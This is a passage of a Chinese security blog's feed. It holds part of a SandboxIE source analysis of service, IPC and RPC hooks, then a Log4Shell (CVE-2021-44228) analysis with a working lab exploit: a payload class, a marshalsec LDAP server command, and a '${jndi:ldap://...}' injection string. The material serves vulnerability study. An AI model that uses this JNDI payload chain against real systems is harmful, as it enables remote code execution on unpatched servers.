title="Scm_CloseServiceHandle"></a>Scm_CloseServiceHandle</h5><p>这里关闭句柄做了判断,自己构造的句柄,并针对回调相关做了其他的处理,后面说明,直接释放字符串.</p><h4 id="2-scm-create-c"><a href="#2-scm-create-c" class="headerlink" title="2.scm_create.c"></a>2.scm_create.c</h4><p><strong>Scm_LockServiceDatabase</strong></p><p>返回了虚拟的句柄HANDLE_SERVICE_LOCK</p><h5 id="Scm-UnlockServiceDatabase"><a href="#Scm-UnlockServiceDatabase" class="headerlink" title="Scm_UnlockServiceDatabase"></a>Scm_UnlockServiceDatabase</h5><p>简单的处理,判断句柄是否为HANDLE_SERVICE_LOCK</p><h5 id="Scm-CreateServiceW"><a href="#Scm-CreateServiceW" class="headerlink" title="Scm_CreateServiceW"></a>Scm_CreateServiceW</h5><p>由于对注册表进行了重定向,沙箱内修改注册表数据不会影响宿主机.</p><p>通过Scm_OpenService,判断该服务是否已存在.如果存在直接返回</p><p>调用windows原始api,在系统注册表中创建该服务的键.并设置各项键值</p><p>之后将该服务名添加入sbiesvc沙箱服务列表中.</p><h5 id="Scm-ChangeServiceConfigW"><a href="#Scm-ChangeServiceConfigW" class="headerlink" title="Scm_ChangeServiceConfigW"></a>Scm_ChangeServiceConfigW</h5><p>验证该服务是否存在,该服务是否是沙箱的服务.</p><p>如果不是并且判断服务前17个字符是否为”clr_optimization_”,如果是,这是程序安装时使用的.net服务,不需要做任何处理,依然会成功.</p><p>如果不是沙箱服务</p><p>如果不是并且判断服务前17个字符是否为”clr_optimization_”,如果是,这是程序安装时使用的.net服务,不需要做任何处理,依然会成功.</p><p>sbie的处理是一律返回无权限.这里控制沙箱内的进程无法修改外部服务配置.</p><p>如果是沙箱的服务</p><p>调用api获取句柄,调用原始api处理,修改配置.</p><h5 id="Scm-DeleteService"><a href="#Scm-DeleteService" class="headerlink" title="Scm_DeleteService"></a>Scm_DeleteService</h5><p>如果不是沙箱的服务,返回无权限.</p><p>如果是沙箱的服务</p><p>获取sbiesvc句柄和要删除的服务句柄.</p><p>调用删除注册表中记录</p><p>在sbiesvb记录的沙盒列表中删除该记录.</p><h5 id="SbieDll-StartBoxedService"><a href="#SbieDll-StartBoxedService" class="headerlink" title="SbieDll_StartBoxedService"></a>SbieDll_StartBoxedService</h5><p>服务的启动.</p><p>SbieRpcSs服务可以将启动的服务添加入沙盒中.</p><p>对参数进行检查,判断该服务是否可以启动.</p><p>修改服务状态,初始化服务</p><p>对sandboxie服务做特殊处理.</p><p>bits服务 WUAU服务 Crypto服务</p><p>通过clsid删除即将启动服务的appid中的LaunchPermission和AccessPermission</p><p>为什么要删除这个,msdn描述这2个值会决定服务的正常启动</p><p>关于LaunchPermission的描述</p><p>这是一个REG_BINARY值。在收到本地或远程请求启动该类的服务器时，在模拟客户端时检查该值所描述的ACL，允许或不允许成功启动服务器。如果这个值不存在，DefaultLaunchPermission值会以同样的方式被检查，以确定该类代码是否可以被启动。</p><p>关于AccessPermission的描述</p><p>这是一个REG_BINARY值。它包含描述可以访问该类实例的委托人的访问控制列表（ACL）的数据。在收到连接到该类现有对象的请求时，被调用的应用程序会在模拟调用者时检查ACL。如果访问检查失败，连接将被拒绝。如果这个命名的值不存在，DefaultAccessPermission ACL将被测试以决定是否允许连接。</p><p>对于不调用CoInitializeSecurity或不使用IGlobalOptions接口来指定AppID的应用程序，必须将应用程序的二进制文件的可执行文件映射到AppID中描述的应用程序的AppID。这是必需的，以便 COM 可以定位应用程序的 AppID。</p><p>而后调用函数SbieDll_RunFromHome,内部使用CreateProcess启动,启动前,使用函数</p><p>AdvApi_EnableDisableSRP hook了SaferComputeTokenFromLevel,确保CreateProcess的正常执行,为什么会hook这个函数呢</p><p>CreateProcess中会调用SaferComputeTokenFromLevel进行一个软件限制策略的检查,SaferComputeTokenFromLevel的返回值决定了是失败还是继续执行.hook后的函数,会返回true</p><p> <img src="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20221019171942165.png" alt="image-20221019171942165"></p><p>执行后,关闭了hook.</p><p>如果上述方式未执行成功,就通过sbiesvc启动,sbiesvc启动前,涉及到了对token的处理</p><h5 id="Scm-StartServiceCtrlDispatherX"><a href="#Scm-StartServiceCtrlDispatherX" class="headerlink" title="Scm_StartServiceCtrlDispatherX"></a>Scm_StartServiceCtrlDispatherX</h5><p>与服务管理器连接,这里直接创建线程执行了serviceMain函数.让服务启动.</p><h5 id="Scm-RegisterServiceCtrlHandlerA"><a href="#Scm-RegisterServiceCtrlHandlerA" class="headerlink" title="Scm_RegisterServiceCtrlHandlerA"></a>Scm_RegisterServiceCtrlHandlerA</h5><p>记录处理函数,和参数的指针,这里定义了全局变量.</p><h5 id><a href="#" class="headerlink" title></a></h5><h4 id="3-scm-event"><a href="#3-scm-event" class="headerlink" title="3.scm_event"></a>3.scm_event</h4><p>主要是日志相关,sbie没做任何处理.</p><h4 id="4-scm-misc"><a href="#4-scm-misc" class="headerlink" title="4.scm_misc"></a>4.scm_misc</h4><p>主要是hook相关</p><h5 id="Scm-SecHostDll"><a href="#Scm-SecHostDll" class="headerlink" title="Scm_SecHostDll"></a>Scm_SecHostDll</h5><p>兼容性处理</p><p>win8下可能获取不到sechost.dll的模块加载基址.如果获取不到,设置标志位.</p><p>win7下做特殊处理,hook advapi32中的一些函数,并将sechost中的对应函数hook至advapi32</p><p>这个函数在启动服务.</p><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="5-Scm-SetupMsiHooks"><a href="#5-Scm-SetupMsiHooks" class="headerlink" title="5.Scm_SetupMsiHooks"></a>5.Scm_SetupMsiHooks</h4><h5 id="Scm-SetupMsiHooks"><a href="#Scm-SetupMsiHooks" class="headerlink" title="Scm_SetupMsiHooks"></a>Scm_SetupMsiHooks</h5><p>这里对msi server进行了权限的处理,hook掉了OpenProcessToken产生的句柄,然后hook GetTokenInformation,在获取这个句柄的信息时,返回系统sid.然后在NtClose清除令牌,防止被使用.</p><p>但是这段代码被取消了.</p><h5 id="Scm-Notify-Init-1"><a href="#Scm-Notify-Init-1" class="headerlink" title="Scm_Notify_Init"></a>Scm_Notify_Init</h5><p>hook</p><h5 id="Scm-NotifyServiceStatusChangeW"><a href="#Scm-NotifyServiceStatusChangeW" class="headerlink" title="Scm_NotifyServiceStatusChangeW"></a>Scm_NotifyServiceStatusChangeW</h5><p>内部调用Scm_Notify_ThreadProc</p><p>查询服务信息,插入用户apc,执行原回调函数</p><h4 id="6-scm-query"><a href="#6-scm-query" class="headerlink" title="6.scm_query"></a>6.scm_query</h4><h5 id="Scm-QueryServiceConfigW"><a href="#Scm-QueryServiceConfigW" class="headerlink" title="Scm_QueryServiceConfigW"></a>Scm_QueryServiceConfigW</h5><p>Scm_QueryServiceByHandle-&gt;Scm_GetHandleName-&gt;Scm_QueryServiceByName</p><p>如果是沙箱服务,自己调api查询</p><p>如果是宿主机服务,交由sbiesvc查询.</p><p>如果是在64位下运行的32位进程,sbiesvc会返回一个32位的结构.这里要处理下.</p><h5 id="EnumServicesStatusA"><a href="#EnumServicesStatusA" class="headerlink" title="EnumServicesStatusA"></a>EnumServicesStatusA</h5><p>枚举当前系统服务</p><p>参数检查.</p><p>调用sbiesvc查询系统服务列表.</p><p>获取沙箱服务列表.</p><p>查询服务状态信息,筛选掉一些服务,类型不匹配的,获取停止的.</p><p>调用函数查询配置信息.</p><h5 id="Scm-GetServiceDisplayNameW"><a href="#Scm-GetServiceDisplayNameW" class="headerlink" title="Scm_GetServiceDisplayNameW"></a>Scm_GetServiceDisplayNameW</h5><p>调函数,查信息.</p><h5 id="Scm-GetServiceKeyNameW"><a href="#Scm-GetServiceKeyNameW" class="headerlink" title="Scm_GetServiceKeyNameW"></a>Scm_GetServiceKeyNameW</h5><p>调函数,获取全部服务,遍历对比lpDisplayName信息,匹配,获取keyname.</p><h5 id="Scm-EnumDependentServicesA"><a href="#Scm-EnumDependentServicesA" class="headerlink" title="Scm_EnumDependentServicesA"></a>Scm_EnumDependentServicesA</h5><p>未做特殊处理,不知道会不会有兼容性问题.</p><h5 id="Scm-QueryServiceObjectSecurity"><a href="#Scm-QueryServiceObjectSecurity" class="headerlink" title="Scm_QueryServiceObjectSecurity"></a>Scm_QueryServiceObjectSecurity</h5><p>此函数作用是检索与服务对象关联的安全描述符,返回的安全描述符是sbie自己构造的.</p><p>sbie构造的sid和dacl.可以知道sbie对安全描述符这一块也没做hook相关处理.</p><p> <img src="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20221024140608559.png" alt="image-20221024140608559"></p><h5 id="Scm-SetServiceObjectSecurity"><a href="#Scm-SetServiceObjectSecurity" class="headerlink" title="Scm_SetServiceObjectSecurity"></a>Scm_SetServiceObjectSecurity</h5><p>未做处理.</p><h1 id="3-IPC和RPC"><a href="#3-IPC和RPC" class="headerlink" title="3.IPC和RPC"></a>3.IPC和RPC</h1><h5 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h5><p>.函数原型: </p><p>NTSTATUS </p><p>NTAPI</p><p>NtCreatePort(</p><p>  OUT PHANDLE PortHandle,</p><p>  IN  POBJECT_ATTRIBUTES ObjectAttributes,</p><p>  IN  ULONG MaxConnectionInfoLength,</p><p>  IN  ULONG MaxMessageLength,</p><p>  IN  ULONG MaxPoolUsage</p><p>);</p><p>功能描述:</p><p>  创建一个LPC port对象。LPC port的创建者即是LPC通信的服务端(服务端)</p><p>参数:</p><p> PortHandle 输出 PHANDLE是一个指针变量，如果函数被成功调用则该变量指向port对象</p><p>ObjectAttributes 输入 POBJECT_ATTRIBUTES指针变量，指向一个描述对象属性的结构。OBJ_KERNEL_HANDLE，OBJ_OPENLINK,OBJ_EXCLUSIVE,OBJ_PERMANENT及OBJ_INHERIT都不是port对象的合法属性。</p><p> MaxConnectionInfoLength 输入 ULONG表示通过port发送的最大数据字节数。</p><p> MaxMessageLength 输入 ULONG表示通过port发送的最大消息字节数。</p><p> MaxPoolUsage 输入 ULONG表示用于消息存储的非分页池的最大数量。0表示使用默认值。</p><p>ZwCreatePort 将验证(MaxDataSize &lt;&#x3D; 0x104) 且(MaxMessageSize &lt;&#x3D; 0x148)。</p><p> NTSTATUS </p><p>NTAPI</p><p>NtConnectPort(</p><p>  OUT PHANDLE PortHandle,</p><p>  IN PUNICODE_STRING PortName,</p><p>  IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,</p><p>  IN OUT PPORT_VIEW ClientView OPTIONAL,</p><p>  OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,</p><p>  OUT PULONG MaxMessageLength OPTIONAL,</p><p>  IN OUT PVOID ConnectionInformation OPTIONAL,</p><p>  IN OUT PULONG ConnectionInformationLength OPTIONAL</p><p> );</p><p>功能描述:</p><p>  创建一个连接命名port的port(客户端)</p><p>参数:</p><p>  PortHandle 输出 PHANDLE 指针变量，指向客户端通信端口。</p><p>  PortName 输入 PUNICODE_STRING指向一个结构体，该结构体描述了要连接的命名port</p><p>  SecurityQos 输入 PSECURITY_QUALITY_OF_SERVICE Points to a structure that specifies the level of impersonation available to the port listener</p><p>   ClientView 输入 输出 可选参数 PPORT_VIEW指针变量，指向一个结构体。该结构体描述了用于发送大量数据给listener的共享内存区，如果调用成功，该结构将被更新。</p><p>​    ServerView 输出 可选参数 PREMOTE_PORT_VIEW指针变量，指向一个调用者分配的缓冲区，该缓冲区接受由listener用于发送大量数据给调用者的共享内存区上的消息。</p><p>​    MaxMessageLength 输出 可选参数 PULONG表示能够通过port发送的数据的最大字节数</p><p>​    ConnectionInformation 输入 输出 可选参数 PVOID指向一个调用者分配的内缓冲区，该缓冲区表示要发送给listener的连接消息并，接收到来自listener的连接消息。</p><p>​    ConnectionInformationLength 输入 输出 可选参数 PULONG表示发送给listener的连接数据字节数，接收由listener发送的连接数据的字节数。</p><p>NTSTATUS </p><p>NTAPI</p><p>NtRequestWaitReplyPort(</p><p>  IN HANDLE PortHandle,</p><p>  IN PPORT_MESSAGE RequestMessage,</p><p>  OUT PPORT_MESSAGE ReplyMessage</p><p>  );</p><p>  功能描述:</p><p>​    给port发送一上请求数据并等待响应(客户端)</p><p>  参数:</p><p>​    PortHandle 输入 HANDLE 一个port对象的句柄。该句柄不需要指定任何的访问规则</p><p>​    RequestMessage 输入 PPORT_MESSAGE 指向一个调用者分配的缓冲，该缓冲描述了发送给port的请求消息</p><p>​    ReplyMessage 输出 PPORT_MESSAGE 指向一个调用者分配的缓冲，该缓冲接发送给port的响应消息。</p><p>NTSTATUS </p><p>NTAPI</p><p>NtCreateSection(</p><p>  OUT PHANDLE SectionHandle,</p><p>  IN ACCESS_MASK DesiredAccess,</p><p>  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,</p><p>  IN PLARGE_INTEGER MaximumSize OPTIONAL,</p><p>  IN ULONG SectionPageProtection,</p><p>  IN ULONG AllocationAttributes,</p><p>  IN HANDLE FileHandle OPTIONAL</p><p>  );</p><p>  功能描述:</p><p>​    创建一个section对象</p><p>  参数:</p><p>​    SectionHandle 输出 PHANDLE 如果函数成功调用将会得到一个section对象的句柄。</p><p>​    DesiredAccess 输入 ACCESS_MASK 表示调用者调用者需要的section对象的访内类型。该参数可以为0，也可以是以下标志的组合：</p><p>​         SECTION_QUERY         - 查询访问</p><p>​               SECTION_MAP_WRITE     - 当被关联时(mapped)可被写入</p><p>​               SECTION_MAP_READ      - 当被关联时(mapped)可被读取</p><p>​               SECTION_MAP_EXECUTE   - 当被关联时(mapped)可被执行</p><p>​               SECTION_EXTEND_SIZE    - 扩展访问</p><p>​               SECTION_ALL_ACCESS    - 上面全部访问类型 + STANDARD_RIGHTS_REQUIRED</p><p>​    ObjectAttributes 输入 可选参数 POBJECT_ATTRIBUTES 指向一个结构体，该结构表示了对象的属性。OBJ_OPENLINK是不合法的属性对于section对象而言。</p><p>​    MaximunSize 输入 可选参数 PLARGE_INTEGER 表示section的字节数。如果 FileHandle为0，这个值必需指定，否则，它将默认为由FileHandle指示的文件的大小。</p><p>​    SectionPageProtection 输入 ULONG 表示页面保护的类型当section被关联时(mapped)。这个参数可以是以值中的任意一个：</p><p>​         PAGE_READONLY</p><p>​              PAGE_READWRITE</p><p>​              PAGE_WRITECOPY</p><p>​              PAGE_EXECUTE</p><p>​              PAGE_EXECUTE_READ</p><p>​              PAGE_EXECUTE_READWRITE</p><p>​              PAGE_EXECUTE_WRITECOPY</p><p>​     AllocationAttributes 输入 ULONG 表示了section的属性。该参数可以是下面这些值的组合:</p><p>​              SEC_BASED     0x00200000 &#x2F;&#x2F; 在每个进程中关联(map)section到同一地址</p><p>​              SEC_NO_CHANGE 0x00400000 &#x2F;&#x2F; 禁止页面保护的改变</p><p>​              SEC_IMAGE      0x01000000 &#x2F;&#x2F; 关联(map)section为一个映象(image)</p><p>​              SEC_VLM       0x02000000 &#x2F;&#x2F; 在VLM区内关联(map)section</p><p>​              SEC_RESERVE    0x04000000 &#x2F;&#x2F; 保留不用分配页面文件存储 Reserve without allocating pagefile storage</p><p>​              SEC_COMMIT    0x08000000 &#x2F;&#x2F; 提交页(Commit pages);默认的形为</p><p>​              SEC_NOCACHE   0x10000000 &#x2F;&#x2F; 标记页为无缓冲区的 Mark pages as non-cacheable</p><p>​     FileHandle 输入 可选参数 HANDLE 指示用于创建section对象的文件。该文件被打开的访问方式要与由保护参数指定的保护类型标志相兼容。如果FileHandle为0，则函数在文件系统中创建一个由页面文件的而不是命名文件支持的指定大小的section对象。</p><h4 id="IPC隔离"><a href="#IPC隔离" class="headerlink" title="IPC隔离"></a><strong>IPC隔离</strong></h4><p><strong>Ipc_Init:</strong></p><p>进行hook的安卓,调用lpc_CreateObjects函数,函数内部会通过创建一个任意对象,获取兑现管理器命名空间,此后所有的对象句柄名位于这个命名空间下,如果不存在命名空间,则发送code,让驱动通过zwcreatesymboliclinkobject创建一个.</p><p><strong>Ipc_GetName</strong></p><p>如果RootDirectory不为空,并且请求的RootDirectory句柄类型为一个文件目录,允许.</p><p>如果既指定了objectName,又指定了路径,则返回一个特殊的状态.</p><p>通过NtQueryObject查询父目录句柄名称.</p><p>对创建句柄时的名称,进行了重命名处理</p><h5 id="Ipc-NtCreateEvent"><a href="#Ipc-NtCreateEvent" class="headerlink" title="Ipc_NtCreateEvent"></a>Ipc_NtCreateEvent</h5><p>对于未命名的事件内核对象不作处理,sbie的理解应该是未命名的Event对象无法跨进程使用.所以不做隔离</p><p>对象完整信息的获取,传参RootDirectory和ObjectName调用Ipc_GetName.</p><p>创建如果没有指定对象管理器命名空间句柄,直接设置RootDirectory指定句柄.</p><p>如果指定了,但是是一个目录不作处理.</p><p>否则返回一个特殊的状态.</p><p>调用原函数</p><p> <img src="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20221012171457582.png" alt="image-20221012171457582"></p><p> <img src="/2022/12/27/SandboxIE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20221012171518546.png" alt="image-20221012171518546"></p><h5 id="Ipc-CreateObjects"><a href="#Ipc-CreateObjects" class="headerlink" title="Ipc_CreateObjects:"></a><strong>Ipc_CreateObjects:</strong></h5><p>首先会通过CreateEvent获取完整对象句柄名,然后获取对象管理器命名空间,如果获取不到,</p><p>向驱动通信,驱动通过函数zwcreatesymboliclinkobject创建一个对象管理器命名空间,此后该进程下创建的对象,都位于这个命名空间下.</p><p><strong>NtAlpcQueryInformationMessage</strong></p><p>某些情况下会返回失败,sbie做的处理只是将返回值修改.</p><h5 id="Ipc-ConnectProxyPort"><a href="#Ipc-ConnectProxyPort" class="headerlink" title="Ipc_ConnectProxyPort"></a>Ipc_ConnectProxyPort</h5><p>代理的lpc端口</p><p>\\RPC Control\\ntsvcs       服务管理器端口</p><p>\\RPC Control\\plugplay   plug and play服务端口 这个服务是用来检测一些插入的硬件设备的</p><p>ClientSharedMemory,ServerSid,ServerSharedMemory必须为null,否则结束流程.</p><p>获取了请求长度,设置长度不大于1024字节.</p><p>转发至了sbieSvc服务,由sbiesvc代理连接一个ipc端口,\\RPC Control \\Sbiesvc Port”;调用原始函数,记录日志.最后对数据进行了兼容性处理,调整了偏移SbieSvc是一个64位进程.</p><p>没有做共享内存相关的处理.</p><p><strong>NtAlpcSendWaitReceivePort hook</strong></p><p><strong>NtConnectPort hook</strong></p><p>连接指定端口,它主要对连接的端口,修改至了当前沙箱的对象句柄命名空间下</p><p><strong>NtAlpcConnectPortEx hook</strong></p><p>对安全描述符进行了处理,为了成功连接至端口,会将安全描述符修改为null.</p><p><strong>IPC_GetServerEvent</strong></p><p>获取一个服务的事件标识,会根据这个标识,判断是否要启动一个sbie的crypt组件的服务,在构建证书连接上下文hook函数中调用</p><p><strong>Ipc_StartServer</strong></p><p>某些端口是一些服务注册的,连接前要先启动服务.</p><p>如果端口为actkernel,则启动sbie的DcomLaunch服务,如果是epmapper服务.则启动sbie的rpcss服务</p><h4 id="RPC隔离"><a href="#RPC隔离" class="headerlink" title="RPC隔离"></a>RPC隔离</h4><p><strong>RpcRt_Init</strong></p><p>hook安装</p><p><strong>RpcStringBindingComposeW hook</strong></p><p>原始函数作用</p><p>生成一个以字符串表示的绑定句柄(bindinghandle)并为此字符串分配内存。因为服务指定了使用本地命名管道作为网络通信介质，所以客户端在建立于服务器的连接时也必须指定相同的管道参数。</p><p>首先判断当前函数返回地址是否在sppc.dll模块空间下.</p><p>sppc.dll是微软软件保护相关的实现,首先将目标alpc端口修改为”SPPCTransportEndpoint-00001”,这个端口是sppsvc.exe注册的.</p><p>然后启动sppsvc服务.</p><p>而后调用原始api.</p><p>这个函数主要对软件保护相关进行了处理,指定了端口,并启动原始服务.</p><p><strong>RpcBindingFromStringBindingW hook</strong></p><p>原始函数作用</p><p>从字符串表示的绑定句柄，创建了一个服务绑定句柄RPCServer_IfHandle。绑定之后客户端便可以请求服务器的服务（调用服务器的函数）。</p><p>首先判断是否是一个活动端口.</p><p>判断调用者的内存空间是否在winspool.drv下,winspool.drv是打印管理相关服务.</p><p>由于是活动端口,当以上条件符合,会调用函数从r0枚举aplc端口,获取PrintSpooler的对应活动端口.</p><p>需要注意的是win8.1之前,该端口名是固定的\RPC Control\spoolss,之后的版本,由spoolsv.exe在系统范围内注册了一个动态的端口.端口映射器\RPC Control\epmapper,hook后绕过了这个端口映射器.</p><p>而后判断此dll是否开启了超时时间的设置,而后调用原始函数,设置超时时间.</p><p><strong>RpcBindingCreateW hook</strong></p><p>快速建立新的rpc连接</p><p>根据情况会指定目标端口,如果uuid&#x3D;&#x3D;RPC interfaceId,并且指定的是本机的rpc.并且是动态端点.并且指定的uuid&#x3D;906B0CE0-C70B-1067-B317-00DD010662DA</p><p>指定为:samss lpc,这里为什么指定这个端口呢.</p><p>samss lpc是lsass.exe的端口,本地安全服务</p><p><strong>RpcBindingInqAuthClientEx hook</strong></p><p>获取发出远程调用的客户端的扩展信息</p><p>这里主要对返回值做了处理,某些特殊情况下会获得失败的返回值,如宿主机安装了某些杀软</p><p><strong>NdrClientCallX</strong></p><p>没做什么特殊的处理,只是打印了一些日志,进行了一些调用的监控.</p><p><strong>Ndr64AsyncClientCall</strong></p><p>这个函数是异步的,主要在uac提权相关会用.</p><p><strong>RpcAsyncCompleteCall</strong></p><p>实现权限相关</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-44228漏洞分析</title>
    <link href="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>idea创建maven项目,引入对应log4j版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>          &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;<br>          &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;<br>          &lt;version&gt;<span class="hljs-number">2.14</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload编译为.class文件,静态代码块会在类被加载时执行.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hacked&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本地开启LDAP服务,监听8888端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer<br>&quot;http://127.0.0.1:7777/#Exploit&quot; 8888<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LogTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://localhost:8888/Exploit&#125;&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>对exploit进行调试</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216165826891.png" alt="image-20211216165826891"></p><p>向下追踪会通过isEnabled函数进行判断level是否&lt;&#x3D;200</p><p><img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216170341524.png" alt="image-20211216170341524"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216170424710.png" alt="image-20211216170424710"></p><p>StandardLevel枚举类,可知level为:OFF,FATAL,ERROR时,都是可以触发漏洞的</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216170558367.png" alt="image-20211216170558367"></p><p>获取指定事件的文本形式,并写入StringBuilder</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221161503823.png" alt="image-20211221161503823"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221161416367.png" alt="image-20211221161416367"></p><p>通过PatternFormatter类成员方法format将event对象反序列化为字符串</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221162014132.png" alt="image-20211221162014132"></p><p>此处对配置进行了一些判断,如果存在配置文件,通过配置工具类PropertiesUtils从配置文件中获取”log4j2.formatMsgNoLookups”值,如果不存在配置文件或者未进行配置,此值默认为false.<br>为false时,会继续向下执行,如果存在”$” “{“字符则获取${}中内容</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221165353545.png" alt="image-20211221165353545"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221165339040.png" alt="image-20211221165339040"></p><p><img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221165238753.png" alt="image-20211221165238753"></p><p>然后对日志事件进行处理</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221170535979.png" alt="image-20211221170535979"></p><p>通过lookup函数,在strLookupMap中将prefix “jndi” 作为key获取该event的对应StrLookup接口类实例,通过lookup函数查找资源exploit并进行加载,实现RCE</p><p><img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221171516170.png" alt="image-20211221171516170"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221171830245.png" alt="image-20211221171830245"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221173112388-164087746810815.png" alt="image-20211221173112388"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2013-1347 漏洞分析与利用</title>
    <link href="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
